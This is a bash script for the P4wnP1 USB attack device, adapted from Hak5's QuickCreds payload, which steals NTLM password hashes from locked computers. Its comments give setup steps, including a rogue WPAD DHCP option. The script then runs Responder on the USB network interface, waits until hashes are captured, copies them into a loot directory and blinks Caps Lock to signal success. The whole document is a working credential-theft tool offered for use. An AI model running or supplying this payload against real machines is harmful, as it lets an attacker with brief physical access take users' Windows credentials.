#!/bin/bash

# Steal hashes from locked machines
# Based on Hak5Darren BashBunny QuickCreds: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/QuickCreds
# Original Article: https://malicious.link/post/2016/snagging-creds-from-locked-machines/
# You need to have responder installed: "apt-get install responder"
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET for Windows or CDC ECM on Mac/*nix
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start the bash script "QuickCreds.sh" when DHCP lease issued.
# In network settings add the following DHCP option for interface USBETH:
# Option number: 252 Option string: http://172.16.0.1/wpad.dat


RESPONDER_OPTIONS="-f -w -r -d -F -P -v --upstream-proxy=UPSTREAM_PROXY"
LOOTDIR=/usr/local/P4wnP1/www/loot/quickcreds
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');

echo "[*] Checking if responder installed..."
if [ ! -f /usr/sbin/responder ]; then
    echo "[!] Responder not found!"
    exit 1
  fi

echo "[*] Killing Responder..."
killall /usr/bin/python2
killall /usr/bin/python2

echo "[*] Clearing responder logs directory..."
rm /usr/share/responder/logs/*

echo "[*] Creating loot dir..."
mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT
mkdir -p /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT

if [ -z "$TARGET_IP" ]; then
	exit 1
fi

echo "[*] Starting responder..."
responder -I usbeth $RESPONDER_OPTIONS &

while ! [ -f /usr/share/responder/logs/*NTLM* ];
do
    echo "[*] Waiting for hashes..."
    sleep 1
done

echo "[+] Hashes captured!"
echo "[*] Copying responder data to loot directory..."
cp /usr/share/responder/logs/* /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
cp /usr/share/responder/logs/* $LOOTDIR/$HOST-$COUNT
echo "[*] Clearing responder logs directory..."
rm /usr/share/responder/logs/*
echo "[*] Killing Responder..."
killall /usr/bin/python2
killall /usr/bin/python2
killall /usr/bin/python2
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
